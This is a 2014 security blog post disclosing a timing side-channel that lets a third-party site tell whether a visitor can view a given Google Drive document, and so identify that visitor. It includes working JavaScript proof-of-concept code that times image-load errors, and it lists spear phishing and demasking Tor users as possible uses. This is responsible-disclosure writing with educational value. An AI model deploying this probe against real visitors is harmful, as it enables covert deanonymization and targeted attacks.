---
layout: post
title: "Demasking Google Users with a Timing Attack"
date: 2014-09-04 13:34:10 -0700
comments: true
categories: [security, javascript]
---
## Responsible Disclosure

I believe strongly in the [responsible disclosure](http://en.wikipedia.org/wiki/Responsible_disclosure) of security issues, [having participated in Google's responsible disclosure program in the past](http://blog.andrewcantino.com/blog/2011/12/14/hacking-google-for-fun-and-profit/) and helping to run a similar [disclosure program](https://hackerone.com/mavenlink) at Mavenlink.

The issues discussed in this post were responsibly disclosed to Google Security.  Google triaged the issues, talked to the involved teams, and declined the opportunity to fix.  They gave me written permission to blog about this.

# The Attack

**Summary**: A 3rd party site can determine if a website viewer has access to a particular Google Drive document.

**Implications**: An attacker could share a document with one or more email addresses, but uncheck the option that causes Google to send a notification.  Now the attacking site can figure out when someone logged into any of the shared addresses visits their site.  This is mostly useful for very targeted attacks, where an attacking site needs to behave differently based on who is viewing.  This could be used for spear phishing, identification of government officials, demasking users of TOR, industrial mischief, etc.

**How it works**:  The attack is straightforward. A malicious page repeatedly instantiates an image whose source points at the URL of a Google Drive document.  If that document is viewable by the visitor, loading the resulting page will take longer than if the document is not viewable.  Since the result isn't an image, the `onerror` callback of the image is triggered in both cases, but we can record how long it takes from image instantiation to triggering of the `onerror`.  This time will be greater when the document is accessible.  In my experiments, loading took an average of 891ms when the document was available, but 573ms when it was not.  Since this is going to be connection-dependent, it makes sense to simultaneously test against a document that is always known to be inaccessible, then compare times with the probe document.

Google chose not to fix this issue, as "the risk here is fairly low, both in terms of impact and difficulty of exploiting this against a large population, and we don't have an effective solution".  I don't really disagree with them-- this *is* hard to fix, and fairly theoretical.  Still, I think this is an interesting example of a timing attack, and shows how hard these sorts of issues can be to avoid.

Here is some example code:

``` javascript
var urls = {
  hasAccess: "https://docs.google.com/document/....../edit",
  doesNotHaveAccess: "https://docs.google.com/document/....../edit"
};

function addImage(src, callback) {
  var elem = document.createElement("IMG");
  elem.src = src + "?r=" + Math.random();
  elem.onerror = callback;
  $("body").append(elem);
}

var times = { 
  hasAccess: { sum: 0, count: 0 }, 
  doesNotHaveAccess: { sum: 0, count: 0 }
};

var testRuns = 40; // a smaller number can be used

function nextTest() {
  testRuns--;
  if (testRuns > 0) {
    var type = Math.random() > 0.5 ? 'hasAccess' : 'doesNotHaveAccess';
    var startTime = new Date().getTime();
    addImage(urls[type], function() {
      var endTime = new Date().getTime();
      times[type].count++;
      times[type].sum = times[type].sum + (endTime - startTime);
      setTimeout(nextTest, 100); // a shorter timeout is fine
    });
  } else {
    $("body").append("hasAccess: " + (times.hasAccess.sum / times.hasAccess.count) + "<br />" + "doesNotHaveAccess: " + (times.doesNotHaveAccess.sum / times.doesNotHaveAccess.count));
  }
}

nextTest()
```
